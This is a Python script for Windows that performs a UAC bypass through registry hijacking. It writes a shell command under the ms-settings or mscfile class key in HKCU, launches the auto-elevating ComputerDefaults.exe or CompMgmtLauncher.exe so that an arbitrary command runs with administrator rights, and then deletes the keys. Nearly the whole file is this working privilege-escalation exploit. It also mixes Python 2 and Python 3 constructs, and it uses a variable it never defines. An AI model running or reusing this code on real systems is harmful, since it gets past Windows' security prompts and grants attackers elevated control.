from os import (startfile,
                _exit)
from sys import (getwindowsversion,
                 executable)
from winreg import (HKEY_CURRENT_USER,
                    EnumValue,
                    OpenKey,
                    KEY_WRITE,
                    HKEY_LOCAL_MACHINE,
                    CreateKey,
                    SetValueEx,
                    REG_SZ,
                    CloseKey,
                    DeleteKey)
from ctypes import windll
from time import sleep
import os
HKCU = HKEY_CURRENT_USER
ver = getwindowsversion()
key = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"


def create_key(path, key, value):
    try:
        CreateKey(HKCU, path)
        reg_key = OpenKey(HKCU, path, 0, KEY_WRITE)
        SetValueEx(reg_key, key, 0, REG_SZ, value)
        CloseKey(reg_key)
    except WindowsError as e:
        return e


def delete_key(path):
    key = path.split("\\")
    for x in range(6, 2, -1):
        reg_path = "\\".join(key[:x])
        DeleteKey(HKCU, reg_path)


def exploit(key, exploit, cmd):
    path = f"Software\\Classes\\{key}\\shell\\open\\command"
    create_key(path, None, cmd)
    create_key(path, "DelegateExecute", None)
    startfile(exploit)
    sleep(0.1)
    delete_key(path)


def uac_bypass(command):
    if windll.shell32.IsUserAnAdmin() == 1:
        startfile(command)
        _exit(0)

    win_ver = ".".join(map(str, (ver.major, ver.minor)))

    uac = EnumValue(OpenKey(HKEY_LOCAL_MACHINE, key), 0)[1]

    if uac == 2:
        UAC_LEVEL = "High"
    elif uac == 5:
        UAC_LEVEL = "Default"
    elif uac == 0:
        UAC_LEVEL = "None"
    else:
        UAC_LEVEL = "Unknown"

    if UAC_LEVEL == "High":
        return "UAC Level too high"
    elif UAC_LEVEL == "None":
        windll.shell32.ShellExecuteW(None,
                                     u"runas",
                                     unicode(executable),
                                     unicode(command),
                                     None,
                                     1)
    else:
        if win_ver == "10.0":
            exploit("ms-settings",
                    "ComputerDefaults.exe",
                    command)
        else:
            exploit("mscfile",
                    "CompMgmtLauncher.exe",
                    command)

#file =  os.path.dirname(__file__)+"\main.py"
#or
#file = PATH TOO WOOL
print(file)
uac_bypass(f"cmd /k start {file}")
